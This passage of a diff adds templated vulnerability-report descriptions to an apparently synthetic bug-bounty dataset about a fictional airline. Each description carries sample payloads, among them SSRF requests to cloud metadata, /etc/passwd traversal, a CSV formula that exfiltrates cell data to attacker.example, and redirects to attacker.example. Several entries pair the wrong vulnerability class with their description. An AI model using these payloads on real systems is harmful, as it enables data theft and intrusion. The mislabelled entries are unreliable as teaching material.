+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.sonnenhafen-airlines.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3532,7 +3559,8 @@
           "offset": "5d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.sonnenhafen-airlines.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3667,7 +3695,8 @@
           "offset": "6d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3829,7 +3858,8 @@
           "offset": "5d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3969,7 +3999,8 @@
           "offset": "7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4149,7 +4180,8 @@
           "offset": "9d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4271,7 +4303,8 @@
           "offset": "5d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4406,7 +4439,8 @@
           "offset": "5d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4497,7 +4531,8 @@
           "offset": "2d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4651,7 +4686,8 @@
           "offset": "5d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4730,7 +4766,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4846,7 +4883,8 @@
           "offset": "5d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4944,7 +4982,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5098,7 +5137,8 @@
           "offset": "6d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5241,7 +5281,8 @@
           "offset": "6d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5388,7 +5429,8 @@
           "offset": "13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.sonnenhafen-airlines.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5535,7 +5577,8 @@
           "offset": "8d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5667,7 +5710,8 @@
           "offset": "4d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5816,7 +5860,8 @@
           "offset": "3d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5935,7 +5980,8 @@
           "offset": "6d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6079,7 +6125,8 @@
           "offset": "7d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6180,7 +6227,8 @@
           "offset": "3d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6303,7 +6351,8 @@
           "offset": "2d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6433,7 +6482,8 @@
           "offset": "2d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6560,7 +6610,8 @@
           "offset": "5d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6720,7 +6771,8 @@
           "offset": "5d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6876,7 +6928,8 @@
           "offset": "6d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7035,7 +7088,8 @@
           "offset": "5d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7187,7 +7241,8 @@
           "offset": "5d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7286,7 +7341,8 @@
           "offset": "2d 10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.sonnenhafen-airlines.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7426,7 +7482,8 @@
           "offset": "3d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.sonnenhafen-airlines.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7533,7 +7590,8 @@
           "offset": "4d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
